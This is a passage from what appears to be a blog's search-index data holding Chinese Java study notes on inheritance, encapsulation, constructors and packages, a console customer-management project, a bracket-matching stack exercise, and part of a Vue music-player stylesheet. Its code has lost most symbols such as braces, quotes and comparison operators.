(num = 10000) return (num / 10000).toFixed(1) + 万 return changeCount /scriptstyle lang=less scoped.itemMusicTop height: 50px; padding: 10px; .itemLeft, .itemRight .van-icon color: #fff; .itemLeft span position: relative; font-size: 25px; margin-left: 30px; top: -2.5px; color: #fff; text-align: center; .itemRight position: absolute; right: 10px; .search margin-right: 40px; .bgImg position: fixed; width: 100%; height: 350px; z-index: -1; filter: blur(40px);.itemMusicCenter margin-top: -15px; padding: 10px; height: 180px; .imgBox padding: 5px; width: 150px; text-align: center; .imgBoxAndplayCount position: relative; height: 130px; width: 130px; .coverImg border-radius: 0.4rem; height: 130px; width: 130px; .playCount position: absolute; right: 0.1rem; top: 0.1rem; font-size: 0.25rem; color: #ccc; display: flex; align-items: center; background-color: rgba(0, 0, 0, 0.2); margin: 4px; padding: 3px; border-radius: 0.4rem; .icon width: 15px; fill: #ccc; .listInfo padding: 5px; flex-flow: column; width: 100%; height: 150px; .title font-weight: 900; color: #fff; font-size: .39rem; text-overflow: ellipsis; white-space: nowrap; overflow: hidden; .creator padding: 10px 5px; color: #ccc; img position: relative; border-radius: 0.6rem; height: 30px; span position: absolute; padding-left: 10px; width: 160px; font-size: .32rem; line-height: 30px; text-overflow: ellipsis; white-space: nowrap; overflow: hidden; .van-icon position: absolute; bottom: 7.5px; padding-left: 15px; .description position: relative; color: #ccc; // width: 80%; height: 80px; .text position: absolute; display: -webkit-box; -webkit-box-orient: vertical; -webkit-line-clamp: 4; overflow: hidden; width: 85%; .van-icon position: absolute; right: 13px; top: 27px; .functionButtons color: #fff; height: 1.5rem; padding: 5px; margin-bottom: 10px; .van-col display: flex; flex-direction: column; align-items: center; /style","tags":["网易云","vue","工程","音乐播放器"],"categories":["Vue前端"]},{"title":"java学习笔记12","path":"//coding/java/note/12.html","content":"面向对象的特征之二：继承性 why?一、继承性的好处： 减少了代码的冗余，提高了代码的复用性 便于功能的扩展 为之后多态性的使用，提供了前提 二、继承性的格式： class A extends B{} A:子类、派生类、subclass B:父类、超类、基类、superclass 2.1 体现：一旦子类 A 继承父类 B 以后，子类 A 中就获取了父类 B 中声明的所有的属性和方法。 特别的，父类中声明为 private 的属性或方法，子类继承父类以后，仍然认为获取了父类中私有的结构。 只有因为封装性的影响，使得子类不能直接调用父类的结构而已。 2.2 子类继承父类以后，还可以声明自己特有的属性或方法：实现功能的拓展。 子类和父类的关系，不同于子集和集合的关系。 extends：延展、扩展 三、Java 中关于继承性的规定： 一个类可以被多个子类继承。 Java 中类的单继承性：一个类只能有一个父类 子父类是相对的概念。 子类直接继承的父类，称为：直接父类。间接继承的父类称为：间接父类 子类继承父类以后，就获取了直接父类以及所有间接父类中声明的属性和方法 四、 Object 类 如果我们没有显式的声明一个类的父类的话，则此类继承于 java.lang.Object 类 所有的 java 类（除 java.lang.Object 类之外）都直接或间接的继承于 java.lang.Object 类 意味着，所有的 java 类具有 java.lang.Object 类声明的功能。 Creature.javapackage com.atguigu.java;/** * @program: project13 * @description: Creature类 * @author: kkx * @create: 2022-03-10 16:31 **/public class Creature public void breath() System.out.println(呼吸); Person.javapackage com.atguigu.java;/** * @program: project13 * @description: Person类 * @author: kkx * @create: 2022-03-10 15:50 **/public class Person extends Creature String name; private int age; public Person() public Person(String name, int age) this.name = name; this.age = age; public void eat() System.out.println(吃饭); public void sleep() System.out.println(睡觉); public int getAge() return age; public void setAge(int age) this.age = age; Student.javapackage com.atguigu.java;/** * @program: project13 * @description: Student类，继承 * @author: kkx * @create: 2022-01-05 10:22 **/public class Student extends Person// String name;// int age; String major; public Student() public Student(String name, int age, String major) this.name = name;// this.age = age; setAge(age); this.major = major; // public void sleep()// System.out.println(睡觉);// public void study() System.out.println(studying); public void show() System.out.println(name: + name + , age: + getAge()); ExtendsTest.javapackage com.atguigu.java;/** * @program: project13 * @description: 继承测试 * @author: kkx * @create: 2022-01-05 10:24 **/public class ExtendsTest public static void main(String[] args) Person p1 = new Person();// p1.age = 1; p1.eat(); System.out.println(); Student s1 = new Student(); s1.eat(); s1.sleep(); s1.name = Tom; s1.setAge(10); s1.show(); s1.breath(); Creature c = new Creature(); System.out.println(c.toString());","tags":["Java","学习笔记","基础","类","继承性"],"categories":["Java学习笔记"]},{"title":"java project 客户管理信息软件","path":"//coding/java/project/2.html","content":"客户管理信息软件参考视频（p248-p259）{bilibili bvid”1Kb411W75N” page”248”} CustomerView 主模块，菜单显示package com.atguigu.p2.ui;import com.atguigu.p2.bean.Customer;import com.atguigu.p2.service.CustomerList;import com.atguigu.p2.util.CMUtility;/** * @program: project12 * @description: 主模块，菜单显示，处理用户操作 * @author: kkx * @create: 2021-12-28 17:12 **/public class CustomerView private CustomerList customerList = new CustomerList(10); public CustomerView() //默认有一个 Customer customer = new Customer(王涛, 男, 23, 13212341234, wt@gmail.com); customerList.addCustomer(customer); /** * @Description: 《显示客户信息管理软件》界面的方法 * @Author: kkx * @Date: 2022/1/4 * @Param: [] * @return: void */ public void enterMainMenu() boolean isFlag = true; while (isFlag) System.out.println( -----------------客户信息管理软件----------------- ); System.out.println( 1 添 加 客 户); System.out.println( 2 修 改 客 户); System.out.println( 3 删 除 客 户); System.out.println( 4 客 户 列 表); System.out.println( 5 退 出 ); System.out.print( 请选择(1-5)：); char menu = CMUtility.readMenuSelection(); switch (menu) case 1: addNewCustomer(); break; case 2: modifyCustomer(); break; case 3: deleteCustomer(); break; case 4: listAllCustomers(); break; case 5: System.out.print (确认是否退出(Y/N)：); char isExit = CMUtility.readConfirmSelection(); if (isExit == Y) isFlag = false; break; /** * @Description: 添加客户的操作 * @Author: kkx * @Date: 2022/1/4 * @Param: [] * @return: void */ private void addNewCustomer() System.out.println(---------------------添加客户---------------------); System.out.print(姓名：); String name = CMUtility.readString(10); System.out.print(性别：); char gender = CMUtility.readChar(); System.out.print(年龄：); int age = CMUtility.readInt(); System.out.print(电话：); String phone = CMUtility.readString(13); System.out.print(邮箱：); String email = CMUtility.readString(30); //包装 Customer customer = new Customer(name, gender, age, phone, email); boolean isSuccess = customerList.addCustomer(customer); if (isSuccess) System.out.println(---------------------添加完成---------------------); else System.out.println(-------------------客户目录已满，添加失败---------------); /** * @Description: 修改客户的操作 * @Author: kkx * @Date: 2022/1/5 * @Param: [] * @return: void */ private void modifyCustomer() System.out.println(---------------------修改客户---------------------); //这两个放外面是因为后面在循环外要调用 int number; Customer cust; for (;;) System.out.print(请选择待修改客户编号(-1退出)：); number = CMUtility.readInt(); if (number == -1) return; cust = customerList.getCustomer(number - 1); if (cust == null) System.out.println(无法找到指定客户！); else break; //修改客户信息 System.out.print(姓名( + cust.getName() + ):); String name = CMUtility.readString(10, cust.getName()); System.out.print(性别( + cust.getGender() + ):); char gender = CMUtility.readChar(cust.getGender()); System.out.print(年龄( + cust.getAge() + ):); int age = CMUtility.readInt(cust.getAge()); System.out.print(电话( + cust.getPhone() + ):); String phone = CMUtility.readString(13, cust.getPhone()); System.out.print(邮箱( + cust.getEmail() + ):); String email = CMUtility.readString(30, cust.getEmail()); Customer newCust = new Customer(name, gender, age, phone, email); boolean isReplaced = customerList.replaceCustomer(number - 1, newCust); if (isReplaced) System.out.println(---------------------修改完成---------------------); else //没有机会执行 System.out.println(---------------------修改失败---------------------); /** * @Description: 删除客户的操作 * @Author: kkx * @Date: 2022/1/5 * @Param: [] * @return: void */ private void deleteCustomer() System.out.println(---------------------删除客户---------------------); int number; for (;;) System.out.print(请选择待删除客户编号(-1退出)：); number = CMUtility.readInt(); if (number == -1) return; Customer customer = customerList.getCustomer(number -1); if (customer == null) System.out.println(无法找到指定客户！); else break; //找到了指定的客户，开始修改 System.out.print(确认是否删除(Y/N)：); char isDelete = CMUtility.readConfirmSelection(); if (isDelete == Y) boolean deleteSuccess = customerList.deleteCustomer(number - 1); if (deleteSuccess) System.out.println(---------------------删除完成---------------------); else //没有机会执行 System.out.println(---------------------删除失败---------------------); else return; /** * @Description: 显示客户列表的操作 * @Author: kkx * @Date: 2022/1/4 * @Param: [] * @return: void */ private void listAllCustomers() System.out.println(---------------------------客户列表--------------------------- ); int total = customerList.getTotal(); if (total == 0) System.out.println(没有客户记录！); else System.out.println(编号\\t姓名\\t性别\\t年龄\\t电话\\t\\t邮箱); Customer[] custs = customerList.getAllCustomers(); for (int i = 0; i custs.length; i++) Customer cust = custs[i]; System.out.println((i + 1) + \\t + \\t + cust.getName() + \\t + cust.getGender() + \\t + \\t + cust.getAge() + \\t + \\t + cust.getPhone() + \\t + cust.getEmail()); System.out.println(-------------------------客户列表完成-------------------------); public static void main(String[] args) CustomerView view = new CustomerView(); view.enterMainMenu(); Customer 管理package com.atguigu.p2.service;import com.atguigu.p2.bean.Customer;/** * @program: project12 * @description: Customer管理 * @author: kkx * @create: 2021-12-28 17:11 **/public class CustomerList private Customer[] customers; private int total; //记录存储的客户的个数 /** * @Description: 构造器，用来初始化customers数组 * @Author: kkx * @Date: 2021/12/28 * @Param: [totalCustomer] 指定customers数组的最大空间 * @return: */ public CustomerList(int totalCustomer) customers = new Customer[totalCustomer]; /** * @Description: 添加指定的客户到数组中 * @Author: kkx * @Date: 2021/12/28 * @Param: [customer] * @return: boolean 是否添加成功 */ public boolean addCustomer(Customer customer) //小于最大则可以添加 if (total customers.length) customers[total] = customer; total++; return true; return false; /** * @Description: 修改指定索引位置上的客户信息 * @Author: kkx * @Date: 2021/12/28 * @Param: [index, cust] * @return: boolean 是否修改成功 */ public boolean replaceCustomer(int index, Customer cust) if (index 0 || index = total) return false; customers[index] = cust; return true; /** * @Description: 删除指定索引位置上的客户信息 * @Author: kkx * @Date: 2022/1/4 * @Param: [index] * @return: boolean 是否删除成功 */ public boolean deleteCustomer(int index) if (index 0 || index = total) return false; for (int i = index; i total - 1; i++) customers[i] = customers[i + 1]; //这里先把最后那个指向null，total再-- customers[--total] = null; return true; /** * @Description: 获取所有客户的客户信息 * @Author: kkx * @Date: 2022/1/4 * @Param: [] * @return: com.atguigu.p2.bean.Customer[] */ public Customer[] getAllCustomers() Customer[] custs = new Customer[total]; for (int i = 0; i total; i++) custs[i] = customers[i]; return custs; /** * @Description: 返回指定索引位置上的Customer * @Author: kkx * @Date: 2022/1/4 * @Param: [index] * @return: 如果找到元素，则返回，如果没有找到，返回null */ public Customer getCustomer(int index) if (index 0 || index = total) return null; return customers[index]; /** * @Description: 获取存储的客户的数量 * @Author: kkx * @Date: 2022/1/4 * @Param: [] * @return: int */ public int getTotal() return total; Customer 类package com.atguigu.p2.bean;/** * @program: project12 * @description: Customer类 * @author: kkx * @create: 2021-12-28 17:08 **/public class Customer private String name; // 姓名 private char gender; // 性别 private int age; // 年龄 private String phone; // 电话 private String email; // 邮箱 public Customer() public Customer(String name, char gender, int age, String phone, String email) this.name = name; this.gender = gender; this.age = age; this.phone = phone; this.email = email; public String getName() return name; public void setName(String name) this.name = name; public char getGender() return gender; public void setGender(char gender) this.gender = gender; public int getAge() return age; public void setAge(int age) this.age = age; public String getPhone() return phone; public void setPhone(String phone) this.phone = phone; public String getEmail() return email; public void setEmail(String email) this.email = email; CMUtility 工具类package com.atguigu.p2.util;/** * @program: project12 * @description: CMUtility工具类 * @author: kkx * @create: 2021-12-28 17:14 **/import java.util.*;/** CMUtility工具类： 将不同的功能封装为方法，就是可以直接通过调用方法使用它的功能，而无需考虑具体的功能实现细节。 */public class CMUtility private static Scanner scanner = new Scanner(System.in); /** 用于界面菜单的选择。该方法读取键盘，如果用户键入’1’-’5’中的任意字符，则方法返回。返回值为用户键入字符。 */ public static char readMenuSelection() char c; for (; ; ) String str = readKeyBoard(1, false); c = str.charAt(0); if (c != 1 c != 2 c != 3 c != 4 c != 5) System.out.print(选择错误，请重新输入：); else break; return c; /** 从键盘读取一个字符，并将其作为方法的返回值。 */ public static char readChar() String str = readKeyBoard(1, false); return str.charAt(0); /** 从键盘读取一个字符，并将其作为方法的返回值。 如果用户不输入字符而直接回车，方法将以defaultValue 作为返回值。 */ public static char readChar(char defaultValue) String str = readKeyBoard(1, true); return (str.length() == 0) ? defaultValue : str.charAt(0); /** 从键盘读取一个长度不超过2位的整数，并将其作为方法的返回值。 */ public static int readInt() int n; for (; ; ) String str = readKeyBoard(2, false); try n = Integer.parseInt(str); break; catch (NumberFormatException e) System.out.print(数字输入错误，请重新输入：); return n; /** 从键盘读取一个长度不超过2位的整数，并将其作为方法的返回值。 如果用户不输入字符而直接回车，方法将以defaultValue 作为返回值。 */ public static int readInt(int defaultValue) int n; for (; ; ) String str = readKeyBoard(2, true); if (str.equals()) return defaultValue; try n = Integer.parseInt(str); break; catch (NumberFormatException e) System.out.print(数字输入错误，请重新输入：); return n; /** 从键盘读取一个长度不超过limit的字符串，并将其作为方法的返回值。 */ public static String readString(int limit) return readKeyBoard(limit, false); /** 从键盘读取一个长度不超过limit的字符串，并将其作为方法的返回值。 如果用户不输入字符而直接回车，方法将以defaultValue 作为返回值。 */ public static String readString(int limit, String defaultValue) String str = readKeyBoard(limit, true); return str.equals()? defaultValue : str; /** 用于确认选择的输入。该方法从键盘读取‘Y’或’N’，并将其作为方法的返回值。 */ public static char readConfirmSelection() char c; for (; ; ) String str = readKeyBoard(1, false).toUpperCase(); c = str.charAt(0); if (c == Y || c == N) break; else System.out.print(选择错误，请重新输入：); return c; private static String readKeyBoard(int limit, boolean blankReturn) String line = ; while (scanner.hasNextLine()) line = scanner.nextLine(); if (line.length() == 0) if (blankReturn) return line; else continue; if (line.length() 1 || line.length() limit) System.out.print(输入长度（不大于 + limit + ）错误，请重新输入：); continue; break; return line;","tags":["Java","基础","类","项目","java bean"],"categories":["Java项目"]},{"title":"java学习笔记11","path":"//coding/java/note/11.html","content":"封装性面向对象的特征一：封装与隐藏一.问题的引入： 当创建一个类的对象后，我们可以通过”对象.属性”的方式，对对象的属性赋值。这里，赋值操作要受到属性的数据类型和存储范围的制约。 除此之外，没有其他制约条件。但是，通常我们需要给属性赋值加入额外的限制条件。 这个条件就不能在属性声明时体现，我们只能通过方法进行限制条件的添加。（比如：setLegs()） 同时，我们需要避免用户再使用”对象.属性”的方式对属性进行赋值。则需要将属性声明为私有的(private). 此时，针对于属性就体现了封装性。 二.封装性的体现： 我们将类的属性 xxx 私有化(private),同时，提供公共的(public)方法来获取(getXxx)和设置(setXxx)此属性的值 拓展：封装性的体现： 如上 不对外暴露的私有的方法 单例模式 三.封装性的体现，需要权限修饰符来配合。 1.Java 规定的 4 种权限（从小到大排列）：private、缺省、protected 、public 2.4 种权限可以用来修饰类及类的内部结构：属性、方法、构造器、内部类 3.具体的，4 种权限都可以用来修饰类的内部结构：属性、方法、构造器、内部类修饰类的话，只能使用：缺省、public 四. 四种访问权限修饰符 修饰符 类内部 同一个包 不同包的子类 同一个工程 private Yes (缺省) Yes Yes protected Yes Yes Yes public Yes Yes Yes Yes 五.java 代码Order 类package com.atguigu.java;/** * @program: project11 * @description: Order类 * @author: kkx * @create: 2021-12-18 23:49 **/public class Order private int orderPrivate; int orderDefault; public int orderPublic; private void methodPrivate() System.out.println(methodPrivate); void methodDefault() System.out.println(methodDefault); public void methodPublic() System.out.println(methodPublic); 同一个包下面调用类package com.atguigu.java;/** * @program: project11 * @description: Oeder类测试 * @author: kkx * @create: 2021-12-18 23:52 **/public class OrderTest public static void main(String[] args) Order order = new Order(); order.orderDefault = 1; order.orderPublic = 2;// a.legs = 4;//The field Animal.legs is not visible order.methodDefault(); order.methodPublic(); 不同包下面调用类package com.atguigu.java1;import com.atguigu.java.Order;/** * @program: project11 * @description: Oeder类测试 * @author: kkx * @create: 2021-12-19 00:13 **/public class OrderTest public static void main(String[] args) Order order = new Order(); //出了Order类所属的包之后，私有的结构、缺省声明的结构就不可以调用了 //order.orderDefault = 1; order.orderPublic = 2; //order.methodDefault(); order.methodPublic(); 六.封装性总结：Java 提供了 4 种权限修饰符来修饰类及类的内部结构，体现类及类的内部结构在被调用时的可见性的大小。类的结构之三：构造器（或构造方法、constructor）的使用 construct：建设、建造。 construction:CCB constructor:建设者 一、构造器的作用： 创建对象 初始化对象的信息 二.Tip： 如果定义构造器的话，则系统默认提供一个空参的构造器。 定义构造器的格式：权限修饰符 类名(形参列表){}。 一个类中定义的多个构造器，彼此可以构成重载。 一旦我们定义了类的构造器之后，系统就不再提供默认的空参构造器。 一个类中，至少会有一个构造器。 三.java 代码Person 类 package com.atguigu.exer;/** * @program: project11 * @description: Person类 * @author: kkx * @create: 2021-12-19 00:24 **/public class Person private int age; private String name; public Person() age = 18; public Person(String n, int a) name = n; age = a; public void setAge(int a) if (a 0 || a 130) throw new RuntimeException(传入的数据非法！); //报红 //也可以先sout然后return age = a; public int getAge() return age; public void setName(String n) name = n; public String getName() return name; Person 类测试 package com.atguigu.exer;/** * @program: project11 * @description: Person类的使用，类权限课后题 * @author: kkx * @create: 2021-12-19 00:25 **/public class PersonTest public static void main(String[] args) Person p1 = new Person(); p1.setAge(12); System.out.println(p1.getName() + \\t + p1.getAge()); Person p2 = new Person(Tom, 21); System.out.println(p2.getName() + \\t + p2.getAge()); 属性赋值的先后顺序 默认初始化 显式初始化 构造器中初始化 通过”对象.方法” 或 “对象.属性”的方式，赋值 以上操作的先后顺序：① - ② - ③ - ④ java 代码package com.atguigu.java1;/** * @program: project11 * @description: 属性赋值的先后顺序 * @author: kkx * @create: 2021-12-19 11:33 **/public class UserTest public static void main(String[] args) User u1 = new User(); System.out.println(u1.age); User u2 = new User(2); u2.setAge(3); System.out.println(u2.age); class User String name; int age = 1; public User() public User(int a) age = a; public void setAge(int a) age = a; javaBeanpackage com.atguigu.java1;/** * @program: project11 * @description: JavaBean * @author: kkx * @create: 2021-12-19 11:45 **/public class Customer public int id; private String name; public Customer() public void setId(int i) id = i; public int getId() return id; public void setName(String n) name = n; public String getName() return name; this 关键字的使用 this 可以用来修饰、调用：属性、方法、构造器 this 修饰属性和方法:this 为：当前对象 或 当前正在创建的对象 在类的方法中，我们可以使用”this.属性”或”this.方法”的方式，调用当前对象属性或方法。但是，通常情况下，我们都选择省略”this.”。特殊情况下，如果方法的形参和类的属性同名时，我们必须显式的使用”this.变量”的方式，表明此变量是属性，而非形参。 在类的构造器同理 this 调用构造器 我们在类的构造器中，可以显式的使用”this(形参列表)”方式，调用本类中指定的其他构造器 构造器中不能通过”this(形参列表)”方式调用自己 如果一个类中有 n 个构造器，则最多有 n - 1 构造器中使用了”this(形参列表)” 规定：”this(形参列表)”必须声明在当前构造器的首行 构造器内部，最多只能声明一个”this(形参列表)”，用来调用其他的构造器 java 代码package com.atguigu.java2;/** * @program: project11 * @description: this关键字 * @author: kkx * @create: 2021-12-19 12:00 **/public class PersonTest public static void main(String[] args) Person p1 = new Person(); p1.setAge(1); System.out.println(p1.getAge()); Person p2 = new Person(Tom, 20); System.out.println(p2.getAge()); class Person private String name; private int age; public Person() System.out.println(Person初始化时，需要考虑如下的1,2,3,4); public Person(String name) this(); //Person初始化时，需要考虑如下的1,2,3,4 this.name = name; public Person(String name, int age) this(name); //这个必须放首行，每个构造器里面只能放一个this（） this.age = age; public void setName(String name) this.name = name; public String getName() return name; public void setAge(int age) this.age = age; public int getAge() return age; public void eat() System.out.println(eating); study(); public void study() System.out.println(studying); boy,gril 测试package com.atguigu.exer2;/** * @program: project11 * @description: Boy类 * @author: kkx * @create: 2021-12-19 12:55 **/public class Boy private String name; private int age; public Boy() public Boy(String name, int age) this.name = name; this.age = age; public String getName() return name; public void setName(String name) this.name = name; public int getAge() return age; public void setAge(int age) this.age = age; public void marry(Girl girl) System.out.println(我要 + girl.getName()); public void shout() if (this.age = 22) System.out.println(yes!); else System.out.println(no~); package com.atguigu.exer2;/** * @program: project11 * @description: Girl类 * @author: kkx * @create: 2021-12-19 12:55 **/public class Girl private String name; private int age; public Girl(String name, int age) this.name = name; this.age = age; public String getName() return name; public void setName(String name) this.name = name; public void marry(Boy boy) System.out.println(我要 + boy.getName()); boy.marry(this); /** * @Description: 比较两个对象的大小 * @Author: kkx * @Date: 2021/12/19 * @Param: [girl] * @return: 正数：当前对象大； 负数：当前对象小 ； 0：当前对象与形参对象相等 */ public int compare(Girl girl) if(this.age girl.age) return 1; else if (this.age girl.age) return -1; else return 0; package com.atguigu.exer2;/** * @program: project11 * @description: Boy，Girl类测试 * @author: kkx * @create: 2021-12-19 12:55 **/public class BoyGirlTest public static void main(String[] args) Boy boy = new Boy(阿强, 21); boy.shout(); Girl girl = new Girl(阿珍, 18); girl.marry(boy); Girl girl1 = new Girl(2233, 11); int compare = girl.compare(girl1); if (compare 0) System.out.println(girl.getName() + 大); else if (compare 0) System.out.println(girl1.getName() + 大); else System.out.println(一样大); Account 测试package com.atguigu.exer3;/** * @program: project11 * @description: Account类 * @author: kkx * @create: 2021-12-19 13:22 **/public class Account private int id;//账号 private double balance;//余额 private double annualInterestRate;//年利率 public Account(int id, double balance, double annualInterestRate) this.id = id; this.balance = balance; this.annualInterestRate = annualInterestRate; public int getId() return id; public void setId(int id) this.id = id; public double getBalance() return balance; public void setBalance(double balance) this.balance = balance; public double getAnnualInterestRate() return annualInterestRate; public void setAnnualInterestRate(double annualInterestRate) this.annualInterestRate = annualInterestRate; public void withdraw (double amount)//取钱 if (balance amount) System.out.println(余额不足，取款失败); return; balance -= amount; System.out.println(成功取出： + amount); public void deposit (double amount)//存钱 if (amount 0) balance += amount; System.out.println(成功存入： + amount); package com.atguigu.exer3;/** * @program: project11 * @description: Customer类 * @author: kkx * @create: 2021-12-19 13:28 **/public class Customer private String firstName; private String lastName; private Account account; public Customer(String f, String l) this.firstName = f; this.lastName = l; public void setAccount(Account account) this.account = account; public String getFirstName() return firstName; public String getLastName() return lastName; public Account getAccount() return account; package com.atguigu.exer3;/** * @program: project11 * @description: Customer, Account测试 * @author: kkx * @create: 2021-12-19 13:32 **/public class CustomerTest public static void main(String[] args) Customer cust = new Customer(Jane, Smith); Account acct =new Account(1000, 2000, 0.0123); cust.setAccount(acct); cust.getAccount().deposit(100); cust.getAccount().withdraw(960); cust.getAccount().withdraw(2000); System.out.println(Customer[ + cust.getLastName() + , + cust.getLastName() + ] + + id: + cust.getAccount().getId() + + annualInterestRate: + cust.getAccount().getAnnualInterestRate()*100 + % + + balance: +cust.getAccount().getBalance()); Bank 测试package com.atguigu.exer4;/** * @program: project11 * @description: Account类 * @author: kkx * @create: 2021-12-19 13:43 **/public class Account private double balance; public Account(double init_balance) this.balance = init_balance; public double getBalance() return balance; //存钱操作 public void deposit(double amt) if(amt 0) balance += amt; System.out.println(存钱成功); //取钱操作 public void withdraw(double amt) if(balance = amt) balance -= amt; System.out.println(取钱成功); else System.out.println(余额不足); package com.atguigu.exer4;/** * @program: project11 * @description: Bank类 * @author: kkx * @create: 2021-12-19 13:43 **/public class Bank private Customer[] customers;// 存放多个客户的数组 private int numberOfCustomers;// 记录客户的个数 public Bank() //这里要造数组，否则会空指针 customers = new Customer[10]; public void addCustomer(String f, String l) Customer cust = new Customer(f, l); customers[numberOfCustomers] = cust; numberOfCustomers++; //customers[numberOfCustomers++] = cust; public int getNumberOfCustomers() return numberOfCustomers; public Customer getCustomer(int index) if (index = 0 index numberOfCustomers) return customers[index]; return null; package com.atguigu.exer4;/** * @program: project11 * @description: Customer类 * @author: kkx * @create: 2021-12-19 13:44 **/public class Customer private String firstName; private String lastName; private Account account; public Customer(String f, String l) this.firstName = f; this.lastName = l; public Account getAccount() return account; public void setAccount(Account account) this.account = account; public String getFirstName() return firstName; public String getLastName() return lastName; package com.atguigu.exer4;/** * @program: project11 * @description: Bank方测试 * @author: kkx * @create: 2021-12-19 13:46 **/public class BankTest public static void main(String[] args) Bank bank = new Bank(); bank.addCustomer(Jane, Smith); bank.getCustomer(0).setAccount(new Account(2000)); bank.getCustomer(0).getAccount().withdraw(500); double balance = bank.getCustomer(0).getAccount().getBalance(); System.out.println(客户： + bank.getCustomer(0).getFirstName() + 的账户余额为： + balance); System.out.println(); bank.addCustomer(万里, 杨); System.out.println(银行客户的个数为： + bank.getNumberOfCustomers()); Package 的使用 为了更好的实现项目中类的管理，提供包的概念 使用 package 声明类或接口所属的包，声明在源文件的首行 包，属于标识符，遵循标识符的命名规则、规范(xxxyyyzzz)、“见名知意” 每”.”一次，就代表一层文件目录。 JDK 中主要的包介绍 java.lang—-包含一些 Java 语言的核心类，如 String、Math、Integer、 System 和Thread，提供常用功能 java.net—-包含执行与网络相关的操作的类和接口。 java.io —-包含能提供多种输入输出功能的类。 java.util—-包含一些实用工具类，如定义系统特性、接口的集合框架类、使用与日期日历相关的函数。 java.text—-包含了一些 java 格式化相关的类 java.sql—-包含了 java 进行 JDBC 数据库编程的相关类接口 java.awt—-包含了构成抽象窗口工具集（abstract window toolkits）的多个类，这些类被用来构建和管理应用程序的图形用户界面(GUI)。 Import 的使用 在源文件中显式的使用 import 结构导入指定包下的类、接口 声明在包的声明和类的声明之间 如果需要导入多个结构，则并列写出即可 可以使用”xxx.*“的方式，表示可以导入 xxx 包下的所有结构 在 java.lang 下的话（java.lang.System 常用），则可以省略 import 结构 如果使用的类或接口是本包下定义的，则可以省略 import 结构 如果在源文件中，使用了不同包下的同名的类，则必须至少有一个类需要以全类名的方式显示。 使用”xxx.*“方式表明可以调用 xxx 包下的所有结构。但是如果使用的是 xxx 子包下的结构，则仍需要显式导入 import static:导入指定类或接口中的静态结构:属性或方法。 package com.atguigu.java2;import com.atguigu.exer4.Account;import com.atguigu.exer4.Bank;import com.atguigu.java2.java3.Dog;import java.util.*; //import 类、接口import static java.lang.System.*; //import static 结构（属性或方法）import static java.lang.Math.*;/** * @program: project11 * @description: PackageImport测试 * @author: kkx * @create: 2021-12-20 14:59 **/public class PackageImportTest public static void main(String[] args) Bank bank = new Bank(); Arrays.toString(new int[]1, 2, 3); HashMap map = new HashMap(); Scanner scanner = null; Account acct = new Account(1000); //全类名的方式显示 com.atguigu.exer3.Account acct1 = new com.atguigu.exer3.Account(1000,2000,0.0123); Date date = new Date(); java.sql.Date date1 = new java.sql.Date(123465l); Dog dog = new Dog(); //import static:导入指定类或接口中的静态结构:属性或方法 out.println(hello); long num = round(81);","tags":["Java","学习笔记","基础","封装性"],"categories":["Java学习笔记"]},{"title":"java练习3","path":"//coding/java/exercise/3.html","content":"用栈进行括号匹配/** * @program: exercise * @description: 用栈进行括号匹配 * @author: yuuko * @create: 2021-12-12 15:42 **/import java.util.Scanner;import java.util.Stack;public class KuoHao public static void main(String[] args) Scanner input=new Scanner(System.in); String s=input.next(); System.out.println(solution(s)); public static boolean solution(String s) StackCharacter stack1=new Stack(); char currentCorrectChar; for(int i=0;is.length();i++) switch (s.charAt(i)) case (: stack1.push()); break; case [: stack1.push(]); break; case : stack1.push(); break; default: if(stack1.isEmpty()) return false; else currentCorrectChar = stack1.pop(); if (currentCorrectChar != s.charAt(i)) return false; if(!stack1.isEmpty()) return false; return true; 自定义栈进行括号匹配/** * @program: exercise * @description: 自己定义的栈 * @author: yuuko * @create: 2021-12-12 15:49 **/public class myCharStack private myCharStack header; private myCharStack next=null; private char content; myCharStack() this.header=this; myCharStack(char content) this.content=content; public void push(char content) myCharStack stack1=new myCharStack(content); stack1.next=this.header.next; this.header.next=stack1; public char pop() if(this.header.next==null) System.out.println(EmptyStackException here); return X; char popContent=this.header.next.content; this.header.next=this.header.next.next; return popContent; public boolean isEmpty() return this.header.next == null; /** * @program: exercise * @description: * @author: kkx * @create: 2021-12-12 15:57 **/import java.util.Scanner;public class myKuoHao public static void main(String[] args) Scanner input=new Scanner(System.in); String s=input.next(); System.out.println(solution(s)); public static boolean solution(String s) myCharStack stack1=new myCharStack(); char currentCorrectChar; for(int i=0;is.length();i++) switch (s.charAt(i)) case (: stack1.push()); break; case [: stack1.push(]); break; case : stack1.push(); break; default: currentCorrectChar = stack1.pop(); if (currentCorrectChar != s.charAt(i)) return false; if(!stack1.isEmpty()) return false; return true;","tags":["Java","进阶","栈"],"categories":["Java练习"]},{"title":"java学习笔记10","path":"//coding/java/note/10.html","content":"1. 理解“万事万物皆对象”1.在 Java 语言范畴中，我们都将功能、结构等封装到类中，通过类的实例化，来调用具体的功能结构 Scanner,String 等文件：File网络资源：URL 2. 涉及到 Java 语言与前端 Html、后端的数据库交互时，前后端的结构在 Java 层面交互时，都体现为类、对象。2、内存解析的说明引用类型的变量，只可能存储两类值：null 或 地址值（含变量的类型） 3. 匿名对象的使用 理解：我们创建的对象，没有显式的赋给一个变量名。即为匿名对象 特征：匿名对象只能调用一次。 java 代码 package com.atguigu.java;/** * @description: 匿名对象 * @author: kkx * @create: 2021-12-12 12:59 **/public class InstanceTest public static void main(String[] args) Phone p = new Phone(); p.playGame(); new Phone().playGame(); new Phone().price = 1999; new Phone().showPrice(); //0.0 //常用 PhoneMall mall = new PhoneMall(); //匿名对象的使用 mall.show(new Phone()); class PhoneMall public void show(Phone phone) phone.sendEmail(); phone.playGame(); class Phone double price; public void sendEmail() System.out.println(发送邮件); public void playGame() System.out.println(玩游戏); public void showPrice() System.out.println(价格为 + price); 4. 自定义工具类的封装package com.atguigu.java;/** * @description: 工具类的封装 * @author: kkx * @create: 2021-12-12 13:38 **/public class ArrayUtil // 求数组的最大值 public int getMax(int[] arr) int maxValue = arr[0]; for (int i = 1; i arr.length; i++) if (maxValue arr[i]) maxValue = arr[i]; return maxValue; // 求数组的最小值 public int getMin(int[] arr) int minValue = arr[0]; for (int i = 1; i arr.length; i++) if (minValue arr[i]) minValue = arr[i]; return minValue; // 求数组的总和 public int getSum(int[] arr) int sum = 0; for (int i = 0; i arr.length; i++) sum += arr[i]; return sum; // 求数组的平均值 public int getAvg(int[] arr) return getSum(arr) / arr.length; //如下的两个同名方法构成了重载 // 反转数组 public void reverse(int[] arr) for (int i = 0; i arr.length / 2; i++) int temp = arr[i]; arr[i] = arr[arr.length - i - 1]; 